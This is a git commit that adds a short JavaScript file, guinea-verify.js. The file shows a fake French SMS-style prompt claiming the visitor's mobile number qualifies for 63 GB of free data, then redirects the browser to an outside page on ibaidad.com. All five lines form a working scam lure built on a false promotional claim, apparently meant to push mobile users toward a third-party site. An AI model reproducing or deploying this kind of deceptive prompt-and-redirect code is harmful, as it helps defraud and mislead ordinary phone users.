aa040cc8c3236070ddd756ce34b6e3aa71009974
mfednewblog8 <nsikakimoh68@gmail.com>
2026-07-08 09:25:19 +0100

    Create guinea-verify.js

---
+++ guinea-verify.js
@@ -0,0 +1,5 @@
+var password = 'ACTIVER 63 Go'
+password=prompt('SMS: Félicitations, votre numéro de mobile est éligible pour recevoir 63 Go de données gratuites ; cliquez sur OK pour activer.','ACTIVER 63 Go');
+if (password != 'ACTIVER 63 Go') {
+location.href='https://ibaidad.com/guinea-sobragui.html';
+}
